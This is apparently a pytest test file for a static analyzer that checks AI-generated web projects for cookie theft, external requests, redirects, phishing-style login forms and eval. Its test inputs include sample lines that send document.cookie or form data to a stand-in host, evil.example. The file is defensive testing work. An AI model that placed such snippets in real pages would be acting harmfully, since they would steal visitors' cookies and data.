"""Analizador estático del codificador (segunda capa; la defensa real es la CSP). Sin tokens ni red."""
import pytest

from assistant.core.coder.analyze import analyze, blockers, summary, warnings


def _codes(files, severity=None):
    return {(f["code"], f["severity"]) for f in analyze(files) if severity in (None, f["severity"])}


def _html(body: str, head: str = "") -> dict:
    return {"index.html": f"<!doctype html><html><head><title>t</title>{head}</head><body>{body}</body></html>"}


@pytest.mark.parametrize("files, code", [
    (_html("<script>fetch('https://evil.example/?c=' + document.cookie)</script>"), "external_request"),
    (_html("<script>fetch(`//evil.example/x`)</script>"), "external_request"),
    (_html("<script>var x=new XMLHttpRequest(); x.open('POST', 'https://evil.example')</script>"), "external_request"),
    ({"js/app.js": "navigator.sendBeacon('/x', data)"}, "external_request"),
    ({"js/app.js": "const ws = new WebSocket('wss://evil.example')"}, "external_request"),
    (_html("", '<script src="https://cdn.example/lib.js"></script>'), "external_script"),
    (_html("", '<script src="//cdn.example/lib.js"></script>'), "external_script"),
    ({"js/app.js": "import x from 'https://cdn.example/m.js'"}, "external_script"),
    ({"js/app.js": "await import('https://cdn.example/m.js')"}, "external_script"),
    (_html("", '<link rel="stylesheet" href="https://fonts.example/css">'), "external_resource"),
    (_html('<img src="https://tracker.example/p.gif">'), "external_resource"),
    (_html('<img srcset="a.png 1x, https://t.example/b.png 2x">'), "external_resource"),
    ({"css/s.css": "@import url('https://fonts.example/x.css');"}, "external_resource"),
    ({"css/s.css": "body{background:url(https://t.example/bg.png)}"}, "external_resource"),
    (_html('<div style="background:url(//t.example/a.png)"></div>'), "external_resource"),
    (_html('<iframe src="other.html"></iframe>'), "nested_frame"),
    (_html('<object data="x"></object>'), "nested_frame"),
    (_html("", '<meta http-equiv="refresh" content="0;url=https://evil.example">'), "redirect"),
    (_html("", '<base href="https://evil.example/">'), "redirect"),
    (_html('<form action="https://evil.example/steal"><input name="q"></form>'), "external_form"),
    # autonavegación: la CSP no la puede impedir, el analizador la bloquea para publicar
    (_html("<script>location.href = 'https://evil.example/?d=' + data</script>"), "external_navigation"),
    (_html("<script>window.location = \"http://evil.example\"</script>"), "external_navigation"),
    (_html("<script>location.assign('https://evil.example')</script>"), "external_navigation"),
    (_html("<script>location.replace('//evil.example')</script>"), "external_navigation"),
    (_html("<script>window.open('https://evil.example')</script>"), "external_navigation"),
])
def test_bloqueantes(files, code):
    assert (code, "block") in _codes(files)
    assert blockers(analyze(files))
    if code == "external_navigation":  # un solo hallazgo: no se repite como aviso de navegación calculada
        assert _codes(files, "warn") == set()


@pytest.mark.parametrize("js", ["location.href = 'pagina2.html'", "location = './nivel2.html?x=' + n",
                                "location.href = '#arriba'"])
def test_navegacion_local_sin_hallazgos(js):
    assert analyze(_html(f"<script>{js}</script>")) == []


@pytest.mark.parametrize("files, code", [
    (_html("<script>eval('1+1')</script>"), "eval"),
    (_html("<script>const f = new Function('return 1')</script>"), "eval"),
    (_html("<script>setTimeout('alert(1)', 10)</script>"), "eval"),
    (_html("<script>location.href = base + path</script>"), "dynamic_navigation"),
    (_html("<script>top.location = x</script>"), "dynamic_navigation"),
    (_html('<input type="password" name="pw">'), "password_field"),
    (_html('<input autocomplete="cc-number">'), "payment_field"),
    (_html('<input name="cvv">'), "payment_field"),
    (_html("<script>localStorage.setItem('k', 1)</script>"), "storage"),
    (_html('<form action="enviar.php"></form>'), "form_action"),
    (_html('<a href="javascript:alert(1)">x</a>'), "javascript_url"),
])
def test_avisos(files, code):
    assert (code, "warn") in _codes(files)
    assert not blockers(analyze(files))


def test_login_que_nombra_una_marca_es_posible_suplantacion():
    files = _html('<h1>Inicia sesión en PayPal</h1><form><input name="email"><input type="password"></form>')
    assert ("impersonation", "warn") in _codes(files)
    propio = _html('<h1>Acceso al marcador del juego</h1><form><input type="password"></form>')
    assert ("impersonation", "warn") not in _codes(propio)


def test_un_proyecto_normal_no_tiene_bloqueantes_ni_avisos():
    files = {
        "index.html": ('<!doctype html><html><head><link rel="stylesheet" href="css/style.css">'
                       '<script src="./js/app.js" defer></script></head><body><h1>Juego</h1>'
                       '<img src="assets/logo.png" alt=""><a href="#jugar">Jugar</a>'
                       '<a href="https://github.com/">mi perfil</a>'
                       '<canvas id="c"></canvas><img src="data:image/png;base64,AAAA"></body></html>'),
        "css/style.css": "body{margin:0;background:url(assets/fondo.png)} h1{color:#333}",
        "js/app.js": ("const c = document.getElementById('c'); let score = 0;\n"
                      "function loop(){ score++; requestAnimationFrame(loop) }\n"
                      "document.querySelector('a').addEventListener('click', () => { location.hash = '#x' })\n"
                      "// fetch('./datos.json') es local\nfetch('./datos.json')\n"
                      "if (a == b) { evaluate(x) }"),
        "assets/logo.png": "",
    }
    found = analyze(files)
    assert not blockers(found) and not warnings(found), found
    assert {f["code"] for f in found} == {"external_link"}  # solo informa; las url() locales del CSS no se rastrean


def test_archivos_que_faltan_y_lineas():
    files = {"index.html": '<html>\n<head>\n<script src="js/no.js"></script>\n</head>\n<body>\n<script>\n\n'
                           'eval("x")\n</script></body></html>'}
    found = analyze(files)
    assert {"code": "missing_file", "severity": "info", "path": "index.html", "line": 3,
            "detail": "references js/no.js, which does not exist"} in found
    assert next(f for f in found if f["code"] == "eval")["line"] == 8


def test_resumen_para_el_modelo():
    assert summary([]) == "Code check: no problems found."
    texto = summary(analyze(_html("<script>fetch('https://x.example');eval('1')</script>")))
    assert texto.startswith("Code check: 1 blocking, 1 warnings.")
    assert "[block] index.html:1 fetch() to another site" in texto
